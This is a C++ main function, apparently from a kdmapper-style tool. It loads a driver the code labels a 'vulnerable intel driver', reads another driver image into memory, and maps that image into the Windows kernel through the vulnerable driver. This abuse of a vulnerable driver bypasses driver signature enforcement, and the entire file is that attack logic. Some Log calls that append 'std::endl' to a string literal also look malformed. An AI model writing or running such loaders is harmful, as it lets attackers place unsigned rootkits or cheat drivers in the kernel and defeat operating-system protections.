#include <iostream>
#include <Windows.h>
#include <Config.h>
#include "utils.hpp"
#include <intel_driver.hpp>
#include "AutoHandle.h"
#include "mapper.h"

const std::wstring DriverPath = TARGET_DRIVER_PATH;

int main()
{

	Log(L"[*] loading vulnerable intel driver\n");
	HANDLE IntelDriverHandle = intel_driver::Load();
	AutoHandle Autoh(IntelDriverHandle);

	if (IntelDriverHandle == INVALID_HANDLE_VALUE)
	{
		Log(L"[-] failed to load vulnerable intel driver\n");
		return -1;
	}
	Log(L"[*] loaded vulnerable intel driver\n");


	std::vector<uint8_t> RawImage = { 0 };
	if (!utils::ReadFileToMemory(DriverPath, &RawImage)) {
		Log(L"[-] Failed to read image to memory" << std::endl);
		intel_driver::Unload(IntelDriverHandle);
		return -1;
	}
	Log(L"[*] loaded driver image to memory\n");



	if (!MapDriver(IntelDriverHandle, RawImage.data()))
	{
		Log(L"[-] Failed to map driver" << std::endl);
		intel_driver::Unload(IntelDriverHandle);
		return -1;
	}
	
	if (!intel_driver::Unload(IntelDriverHandle))
	{
		Log(L"[*] failed to unload vulnerable intel driver\n");
		return -1;
	}

	return 0; 
}